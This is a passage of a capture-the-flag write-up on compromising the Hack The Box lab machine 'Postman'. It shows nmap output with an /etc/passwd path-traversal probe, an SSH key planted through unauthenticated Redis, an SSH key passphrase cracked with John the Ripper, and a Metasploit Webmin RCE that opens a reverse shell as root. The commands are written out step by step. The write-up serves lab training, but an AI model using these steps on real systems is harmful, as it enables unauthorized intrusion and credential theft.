|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to 
include local files via the $__redirect parameter, possibly involving the subform array. 
|        
|     Disclosure date: 2005-10-nil 
|     Extra information: 
|       ../../../../../etc/passwd : 
|   <h1>Error - Document follows</h1> 
|   <p>This web server is running in SSL mode. Try the URL <a href='https://Postman:10000/'>https://Postman:10000/</a> instead
.<br></p> 
|    
|     References: 
|       http://www.exploit-db.com/exploits/1244/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299 
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete 
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17)
 (94%), Linux 3.16 (93%), Linux 3.18 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 5.1 (93%), Oracle VM Server 3.4.2 (Linux
 4.1) (93%), Android 4.1.1 (93%) 
No exact OS matches for host (test conditions non-ideal). 
TCP/IP fingerprint: 
SCAN(V=7.92%E=4%D=4/12%OT=22%CT=%CU=33728%PV=Y%DS=2%DC=T%G=N%TM=6255492A%P=x86_64-pc-linux-gnu) 
SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A) 
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11) 
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) 
ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=) 
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=) 
T2(R=N) 
T3(R=N) 
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) 
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) 
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) 
IE(R=Y%DFI=N%T=40%CD=S) 
 
Uptime guess: 33.047 days (since Thu Mar 10 14:03:13 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=262 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   283.88 ms 10.10.14.1 
2   283.86 ms 10.10.10.160
```

## we got 4 open ports , 22,80,6379,10000 , port 6379 is redis let's first check this port

```console
redis-cli -h 10.10.10.160
```

## it does not have any authentication let enumerate this .

```console
$ redis-cli -h 10.10.10.160 
10.10.10.160:6379> CONFIG GET dir 
1) "dir" 
2) "/var/lib/redis/.ssh" 
10.10.10.160:6379> keys *
```

## what we need to do is : first we need to create a ssh key using below command

```console
ssh-keygen -t rsa -f htb
```

## it create a key then we need to register it via redis server .

```console
$ (echo -e "\n\n"; cat htb.pub; echo -e "\n\n") > htb.txt 
$ cat htb.txt | redis-cli -h 10.10.10.160 -x set htb 
OK 
$ redis-cli -h 10.10.10.160 
10.10.10.160:6379> keys * 
1) "crackit" 
2) "hack" 
3) "htb" 
(1.87s) 
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys 
OK 
10.10.10.160:6379> save 
OK 
10.10.10.160:6379> exit
```

## now after register we are able to login via ssh using below command

```console
ssh -i htb redis@10.10.10.160
```

## then i start enumerating and i look inside in .bash_history output given below

```console
redis@Postman:~$ cat .bash_history 
exit 
su Matt 
pwd 
nano scan.py 
python scan.py 
nano scan.py 
clear 
nano scan.py 
clear 
python scan.py 
exit 
exit 
cat /etc/ssh/sshd_config  
su Matt 
clear 
cd /var/lib/redis 
su Matt 
exit 
cat id_rsa.bak  
ls -la 
exit 
cat id_rsa.bak  
exit 
ls -la 
crontab -l 
systemctl enable redis-server 
redis-server 
ifconfig 
netstat -a 
netstat -a 
netstat -a 
netstat -a 
netstat -a > txt 
exit 
crontab -l 
cd ~/ 
ls 
nano 6379 
exit 
redis@Postman:~$
```

## here we notice user matt and a encrypted key id_rsa.bak

## i got to  /opt/ found id_rsa.bak file, 

```console
redis@Postman:~$ cd /opt 
redis@Postman:/opt$ ls 
id_rsa.bak
```

## i copy the content of this file and save it in my system 

## We use the ssh2john script to create a hash for this key and crack it using john the ripper.

```console
$python2 /usr/share/john/ssh2john.py matt.key > matt.hash 

$john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash   
Using default input encoding: UTF-8 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) 
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes 
Cost 2 (iteration count) is 2 for all loaded hashes 
Will run 8 OpenMP threads 
Note: This format may emit false positives, so it will keep trying even after 
finding a possible candidate. 
Press 'q' or Ctrl-C to abort, almost any other key for status 
computer2008     (matt.key) 
Warning: Only 2 candidates left, minimum 8 needed for performance. 
1g 0:00:00:05 DONE (2022-04-12 15:50) 0.1828g/s 2621Kp/s 2621Kc/s 2621KC/sa6_123..*7¡Vamos! 
Session completed
```

## using this password we can escalate our privileges to user matt.

```console
redis@Postman:~$ su Matt 
Password:  
Matt@Postman:/var/lib/redis$ cd 
Matt@Postman:~$ ls 
user.txt 
Matt@Postman:~$ 
```

## As we knew that webmin was running over  port 10000 that have a login page i use same creds of user Matt and login successfully.

## we got webmin version after login after i search for his exploit and found a metasploit exploit 

```console
$searchsploit webmin 1.910 
-------------------------------------------------------------------------------------------- --------------------------------- 
 Exploit Title                                                                              |  Path 
-------------------------------------------------------------------------------------------- --------------------------------- 
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                      | linux/remote/46984.rb 
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                               | linux/webapps/47330.rb 
-------------------------------------------------------------------------------------------- ---------------------------------
```

## now let's load metasploit and use this exploit

```console
msf6 > search webmin package updates 
 
Matching Modules 
================ 
 
   #  Name                                     Disclosure Date  Rank       Check  Description 
   -  ----                                     ---------------  ----       -----  ----------- 
   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execut
ion 
 
 
Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_packageup_rce 
 
msf6 > use 0 
[*] Using configured payload cmd/unix/reverse_perl 
msf6 exploit(linux/http/webmin_packageup_rce) > show options 
 
Module options (exploit/linux/http/webmin_packageup_rce): 
 
   Name       Current Setting  Required  Description 
   ----       ---------------  --------  ----------- 
   PASSWORD                    yes       Webmin Password 
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...] 
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M 
                                         etasploit 
   RPORT      10000            yes       The target port (TCP) 
   SSL        false            no        Negotiate SSL/TLS for outgoing connections 
   TARGETURI  /                yes       Base path for Webmin application 
   USERNAME                    yes       Webmin Username 
   VHOST                       no        HTTP server virtual host 
 
 
Payload options (cmd/unix/reverse_perl): 
 
   Name   Current Setting  Required  Description 
   ----   ---------------  --------  ----------- 
   LHOST                   yes       The listen address (an interface may be specified) 
   LPORT  4444             yes       The listen port 
 
 
Exploit target: 
 
   Id  Name 
   --  ---- 
   0   Webmin <= 1.910 
 
 
msf6 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.14.10 
LHOST => 10.10.14.10 
msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160 
rhosts => 10.10.10.160 
msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt 
username => Matt 
msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008 
password => computer2008 
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true 
[!] Changing the SSL option's value may require changing RPORT! 
ssl => true 
msf6 exploit(linux/http/webmin_packageup_rce) > exploit 
 
[*] Started reverse TCP handler on 10.10.14.10:4444  
[+] Session cookie: 4617040bd4230ec6cea9af56611d20eb 
[*] Attempting to execute the payload... 
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.160:50060 ) at 2022-04-12 16:35:42 +0530 
is 
id 
 
uid=0(root) gid=0(root) groups=0(root)
```

# BOOMMM!!! WE GOT ROOT SHELL

![funny](https://c.tenor.com/e4zlI5BdLAUAAAAd/happy-dance-kermit-the-frog.gif)
